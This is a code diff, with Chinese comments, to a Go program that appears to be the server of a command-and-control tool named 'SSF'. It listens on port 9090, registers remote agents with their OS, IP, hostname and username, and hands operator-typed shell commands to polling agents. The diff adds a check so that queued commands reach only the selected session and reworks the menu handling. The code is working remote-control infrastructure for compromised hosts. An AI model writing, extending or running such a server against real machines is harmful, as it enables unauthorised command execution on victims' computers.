@@ -4,6 +4,7 @@ import (
 	"bufio"
 	"encoding/base64"
 	"fmt"
+	"github.com/fatih/color"
 	"github.com/olekukonko/tablewriter"
 	"io/ioutil"
 	"math/rand"
@@ -15,10 +16,8 @@ import (
 	"strings"
 	"time"
 
-	"github.com/AlecAivazis/survey"
 	"github.com/axgle/mahonia"    //中文编码
 	"github.com/c-bata/go-prompt" // 增加tab 下拉菜单
-	"github.com/fatih/color"
 )
 
 const help_shell = `
@@ -40,8 +39,7 @@ var (
 	OS, Arch, IP, hostname, domain, username string //  func info_os()  表格变量
 	cmd                                      string = ""
 	AGENTS                                   map[string]string
-	session_id                               string
-	ID                                       string = ""
+	session_id                               string=""
 	//全局变量
 )
 
@@ -56,7 +54,7 @@ func GetRandomString(l int) string {
 	return string(result)
 }
 
-func sayhelloName(w http.ResponseWriter, r *http.Request) {
+func httpserver(w http.ResponseWriter, r *http.Request) {
 	r.ParseForm()
 
 	//url正则
@@ -80,18 +78,26 @@ func sayhelloName(w http.ResponseWriter, r *http.Request) {
 		url_path, _ := regexp.Compile(`[A-Z]+`)
 		var id = url_path.FindString(r.URL.Path)
 		//fmt.Println(id)
+		//两点一判断id是否存在
+		//二判断请求id是否是设置的id
+		/*
+		在进入判断是否是设置的id
+		 */
 		_, ok := AGENTS[id]
 		if ok {
-			if cmd != "" {
-				fmt.Fprint(w, cmd)
-				cmd = ""
-				_ = r.Close
+			if id==session_id {
+				if cmd != "" {
+					fmt.Fprint(w, cmd)
+					cmd = ""
+					_ = r.Close
+				} else {
+					fmt.Fprint(w, "")
+				}
 			} else {
 				fmt.Fprint(w, "")
 			}
 		} else {
 			fmt.Fprintf(w, "REGISTER")
-
 		}
 
 		//re接收返回信息
@@ -286,6 +292,7 @@ func clear() {
 	}
 	//定义系统清屏clear()
 }
+
 func completer(in prompt.Document) []prompt.Suggest { //一级菜单栏列表
 	s := []prompt.Suggest{
 		{Text: "shell"},
@@ -296,21 +303,13 @@ func completer(in prompt.Document) []prompt.Suggest { //一级菜单栏列表
 	}
 	return prompt.FilterHasPrefix(s, in.GetWordBeforeCursor(), true)
 }
-func Session_id() {
-	Blue := color.New(color.FgBlue).SprintFunc() //颜色设定 https://github.com/fatih/color
-	session_id = ""
-	prompt := &survey.Input{
-		Message: "Interact id ",
-	}
 
-	survey.AskOne(prompt, &session_id, survey.WithIcons(func(icons *survey.IconSet) {
-
-		icons.Question.Text = "メ "
-		icons.Question.Format = "red+hb"
-
-	}))
-	fmt.Printf("%s setting Interact session id => %s.\n", Blue("[*]"), session_id) //https://github.com/fatih/color
+func Session_id(id string) {
+	Blue := color.New(color.FgBlue).SprintFunc()
+	session_id=strings.Split(id," ")[1]
+	fmt.Printf("%s setting Interact session id => %s.\n", Blue("[*]"), session_id)
 }
+
 func Options() { //定义tab 下拉菜单选项参数
 	for true {
 		options := prompt.Input("SSF >", completer,
@@ -319,33 +318,52 @@ func Options() { //定义tab 下拉菜单选项参数
 			prompt.OptionSelectedSuggestionBGColor(prompt.LightGray), //下拉菜单的字背景
 			prompt.OptionSuggestionBGColor(prompt.DarkGray))          //菜单框背景
 
-		switch {
-
-		case options == "shell":
+		if options == "shell" {
 			for true {
 				fmt.Print("Console_shell >")
 				Scanf(&cmd)
 
 			}
-		case options == "help":
+		}else if options == "help" {
 			fmt.Println(help)
-		case options == "Interact":
-			Session_id()
-		case options == "session list":
+		}else if strings.Contains(options,"Interact") {
+			Session_id(options)
+		}else if options == "session list" {
 			info_os()
-		case options == "exit":
+		}else if options == "exit" {
 			os.Exit(0)
 			break
-		default:
+		}else{
 			fmt.Println("错误选项")
-
 		}
+		//switch {
+		//
+		//case options == "shell":
+		//	for true {
+		//		fmt.Print("Console_shell >")
+		//		Scanf(&cmd)
+		//
+		//	}
+		//case options == "help":
+		//	fmt.Println(help)
+		//case options == "Interact":
+		//	Session_id(options)
+		//case options == "session list":
+		//	info_os()
+		//case options == "exit":
+		//	os.Exit(0)
+		//	break
+		//default:
+		//	fmt.Println("错误选项")
+		//
+		//}
 	}
 
 }
+
 func main() {
 	AGENTS = make(map[string]string)
-	http.HandleFunc("/", sayhelloName) //设置访问的路由
+	http.HandleFunc("/", httpserver) //设置访问的路由
 
 	go http.ListenAndServe(":9090", nil) //设置监听的端口
 	clear()                              //系统清屏
